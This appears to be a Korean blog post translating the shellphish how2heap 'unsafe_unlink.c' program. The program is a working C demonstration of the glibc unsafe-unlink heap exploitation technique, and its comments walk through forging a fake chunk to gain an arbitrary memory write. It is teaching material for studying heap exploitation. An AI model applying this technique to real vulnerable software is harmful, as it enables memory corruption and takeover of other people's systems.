---
layout: post
title: how2heap - unsafe_unlink.c 번역
tags: [system, heap]
---

[원문]



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("우분투 14.04/16.04 64비트에서 테스트 되었다.\n");
	printf("이 기술은 unlink를 호출할 수 있는 지역의 알고있는 위치의 포인터를 가지고 있을 때 사용 가능하다.\n");
	printf("가장 대부분의 시나리오는 오버플로우 가능하고 전역 포인터를 갖는 취약한 버퍼에서이다.\n");

	int malloc_size = 0x80; //fastbins을 사용하지 않는 충분히 큰 버퍼여야 한다.
	int header_size = 2;

	printf("이 연습의 포인트는 arbitrary memory write를 성공하기 위해서 free를 전역 변수 chunk0_ptr을 corrupt하는데 사용하는 것이다.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("전역 변수 chunk0_ptr은 %p에 있고, %p를 가리키고 있다.\n", &chunk0_ptr, chunk0_ptr);
	printf("corrupt할 vicctim 청크는 %p에 있다.\n\n", chunk1_ptr);

	printf("우리는 chunk0안에 가짜 청크를 생성한다.\n");
	printf("가짜 청크의 'next_free_chunk'(fd)가 &chunk0_ptr 근처를 가리키게 설정해서 P->fd->bk = P가 되게 한다.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("가짜 청크의 'previous_free_chunk'(bk)가 &chunk0_ptr의 근처를 가리키게 설정해서 P->bk->fd=P가 되게 한다.\n");
	printf("이 설정을 통해 우리는 (P->fd->bk != P || P->bk->fd != P) == False의 체크를 통과할 수 있다.\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("가짜 청크 fd: %p\n",(void*) chunk0_ptr[2]);
	printf("가짜 청크 bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("우리는 다음 청크(fd->prev_size)의 'previous_size'와 우리의 가짜 청크의 크기를 맞출 필요가 있다.\n");
	printf("이 설정을 통해 우리는 (chunksize(P) != prev_size(next_chunk(P)) == False의 체크를 통과할 수 있다.\n");
	printf("P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))");
	printf("If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).");
	printf("우리는 체크를 통과하기 위해서 *(chunk0_ptr + x) = x을 설정해줘야 한다.");
	printf("1.현재 x는 chunk0_ptr[1]&(~0x7) = 0이다, 우리는 *(chunk0_ptr + 0) = 0을 설정해야 한다,다시 말해 아무 것도 하지 말아야 한다.");
	printf("2.더 64비트 환경에서 chunk0_ptr 0x8로 설정한다, 그러면 *(chunk0_ptr + 0x8) == chunk0_ptr[1]이 되고, pass하기 좋아진다.");
	printf("3.마지막으로 64비트 환경에서 chunk0_ptr =x를 설정한다. 그리고 *(chunk0_ptr+x)=x로 설정한다. 예시 chunk_ptr0[1] = 0x20, chunk_ptr[4] = 0x20");
	chunk0_ptr[1] = sizeof(size_t);
	printf("따라서, 우리는 가짜 청크의 크기를 chunk0_ptr[-3]의 값 0x%08lx로 설정해주었다.\n", chunk0_ptr[1]);
	printf("https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30에서 이러한 check의 commitdiff를 찾을 수 있다.\n\n");

	printf("chunk0에서 오버플로우를 가지고 있으므로 chunk1의 메타데이터를 자유롭게 변경할 수 있다고 가정하자.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("우리는 chunk0의 사이즈를 축소시켜서(chunk1의 'previous_size'에 저장되어 있는) free가 우리가 위치시킨 가짜 청크가 위치한 곳에서 chunk0이 시작하는 것으로 생각하게 할 것이다.\n");
	printf("우리의 가짜 청크가 정확히 알려진 포인터에서 시작하고 우리가 그 청크를 축소시킬 수 있다는 점이 중요하다.\n");
	chunk1_hdr[0] = malloc_size;
	printf("우리가 '정상적으로' 프리된 chunk0를 가졌다면, chunk1.previous_size는 0x90을 가졌을 것이다. 하지만 이것은 새로운 값인 %p를 가진다.\n",(void*)chunk1_hdr[0]);
	printf("chunk1의 'previsou_in_use'를 flase로 세팅함으로써 가짜 청크가 free된 것처럼 보이게 한다.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("이제 chunk1을 프리하면 이전 청크와 병합되면서 가짜 청크가 unlink되고 chunk0_ptr이 덮어씌워질 것이다.\n");
	printf("unlink 매크로 소스를 이곳에서 찾을 수 있다 : https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("이제 우리는 chunk0_ptr를 임의의 위치로 덮어쓸 수 있다.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr는 이제 우리가 원하는 곳을 가리키고, 우리는 victim 문자열을 그것을 사용해서 덮어 씌웠다.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);
}
```



[원문]: <https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c>